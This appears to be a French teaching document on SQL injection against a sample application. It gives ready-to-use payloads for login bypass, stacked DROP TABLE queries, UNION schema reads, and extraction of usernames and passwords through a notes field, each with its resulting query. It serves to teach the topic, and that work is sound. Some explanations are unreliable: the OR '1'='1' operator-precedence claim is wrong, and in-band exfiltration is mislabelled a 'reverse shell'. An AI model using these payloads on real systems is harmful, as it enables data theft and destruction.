# Types d'injections SQL

Ce document présente différents types d'injections SQL avec des exemples concrets basés sur l'application escuelle.

---

## 1. Injections qui complètent la requête légitime

Ces injections modifient la logique de la requête originale pour la faire fonctionner d'une manière non prévue, tout en gardant une syntaxe SQL valide.

### Exemple 1 : Bypass d'authentification simple

**Contexte** : L'application utilise une requête SQL pour vérifier les identifiants :
```sql
SELECT * FROM MUtilisateur WHERE nom = '[input_nom]' AND motDePasse = '[input_password]'
```

**Injection dans le champ nom** :
```sql
alice'; --
```

**Requête SQL résultante** :
```sql
SELECT * FROM MUtilisateur WHERE nom = 'alice';--' AND motDePasse = 'toto'
```

**Résultat** :
- La partie `--` est un commentaire SQL qui ignore tout ce qui suit
- La vérification du mot de passe est donc ignorée
- On se connecte en tant que "alice" sans connaître son mot de passe
- L'attaquant a simplement complété la requête originale pour désactiver une partie de la condition


### Exemple 2 : Connexion en tant que premier utilisateur

**Injection dans le champ nom** :
```sql
' OR '1'='1
```

**Requête SQL résultante** :
```sql
SELECT * FROM MUtilisateur WHERE nom = '' OR '1'='1' AND motDePasse = 'nimportequoi'
```

**Résultat** :
- La condition `'1'='1'` est toujours vraie
- La requête retourne tous les utilisateurs
- L'application utilise généralement le premier résultat, donnant accès au premier compte de la base
- Aucune connaissance préalable des noms d'utilisateur n'est nécessaire

---

## 2. Injections en mode "batch" (multiples requêtes)

Ces injections complètent la requête d'origine pour la rendre syntaxiquement correcte, puis ajoutent une ou plusieurs nouvelles requêtes SQL.

### Base de l'injection batch

**Injection dans le champ nom** :
```sql
'; --
```

**Requête SQL résultante** :
```sql
SELECT * FROM MUtilisateur WHERE nom = ''; --' AND motDePasse = 'toto'
```

**Explication** :
- La première requête `SELECT * FROM MUtilisateur WHERE nom = ''` est valide (retourne rien)
- Le `--` met en commentaire le reste de la requête originale
- L'espace entre `;` et `--` permet d'insérer n'importe quelle commande SQL


### Exemple 1 : Destruction de données

**Injection dans le champ nom** :
```sql
'; DROP TABLE IF EXISTS MNote; DROP TABLE IF EXISTS MUtilisateur; --
```

**Requête SQL résultante** :
```sql
SELECT * FROM MUtilisateur WHERE nom = ''; DROP TABLE IF EXISTS MNote; DROP TABLE IF EXISTS MUtilisateur; --' AND motDePasse = 'toto'
```

**Résultat** :
- Première requête : `SELECT` valide mais retourne rien
- Deuxième requête : Suppression de la table MNote
- Troisième requête : Suppression de la table MUtilisateur
- Toutes les données de l'application sont détruites


### Exemple 2 : Injection avec UNION pour lire le schéma

**Injection dans le champ nom lors de la création de compte** :
```sql
bob', 'password') UNION SELECT (SELECT GROUP_CONCAT(sql, '; ') FROM sqlite_master WHERE type = 'table' AND sql IS NOT NULL), sqlite_version(); --
```

**Requête SQL résultante** :
```sql
INSERT INTO MUtilisateur (nom, motDePasse) VALUES ('bob', 'password') UNION SELECT (SELECT GROUP_CONCAT(sql, '; ') FROM sqlite_master WHERE type = 'table' AND sql IS NOT NULL), sqlite_version(); --', '[password_input]')
```

**Résultat** :
- L'UNION permet de créer un tuple additionnel dans le résultat
- La sous-requête `SELECT GROUP_CONCAT(sql, '; ') FROM sqlite_master` récupère le schéma complet de la base
- Ce résultat est inséré comme un utilisateur
- En listant les utilisateurs, on peut lire le schéma de la base dans le champ "nom"

---

## 3. ANNEXE : Injection avec "reverse shell" (lecture de résultat)

Cette technique avancée permet d'exécuter une commande SQL arbitraire et de lire son résultat via l'interface de l'application.

### Principe

1. Trouver un point d'injection SQL
2. Créer une requête qui exécute une commande et stocke le résultat dans un champ visible
3. Utiliser l'interface de l'application pour lire ce résultat
4. Répéter avec d'autres commandes pour extraire toutes les données souhaitées

### Exemple concret : Extraire le schéma via les notes

**Étape 1** : Se créer un compte normalement et récupérer son ID (exemple : ID = 4)

**Étape 2** : Créer un second compte avec l'injection suivante dans le champ nom :
```sql
alice','password'); INSERT INTO MNote (note, utilisateurID) VALUES((SELECT GROUP_CONCAT(sql, '; ') FROM sqlite_master WHERE type = 'table' AND sql IS NOT NULL), 4); --
```

**Requête SQL résultante** :
```sql
INSERT INTO MUtilisateur (nom, motDePasse) VALUES ('alice','password'); INSERT INTO MNote (note, utilisateurID) VALUES((SELECT GROUP_CONCAT(sql, '; ') FROM sqlite_master WHERE type = 'table' AND sql IS NOT NULL), 4); --', '[password_input]')
```

**Étape 3** : Se connecter avec le premier compte (ID = 4)

**Étape 4** : Consulter les notes

**Résultat** :
- Une note a été créée contenant le schéma complet de la base de données
- L'attaquant peut lire ce résultat directement dans l'interface
- Cette technique peut être répétée avec n'importe quelle requête SELECT
- Exemples de données extractibles :
  - Liste de tous les utilisateurs : `SELECT GROUP_CONCAT(nom || ':' || motDePasse, ', ') FROM MUtilisateur`
  - Contenu de toutes les notes : `SELECT GROUP_CONCAT(note, ' | ') FROM MNote`
  - Métadonnées système : `SELECT sqlite_version()`

### Pourquoi c'est dangereux

- L'attaquant n'a pas besoin d'accès direct à la base de données
- Tout peut être fait via l'interface normale de l'application
- L'attaquant peut extraire progressivement toutes les données
- C'est difficile à détecter si on ne surveille pas les logs SQL
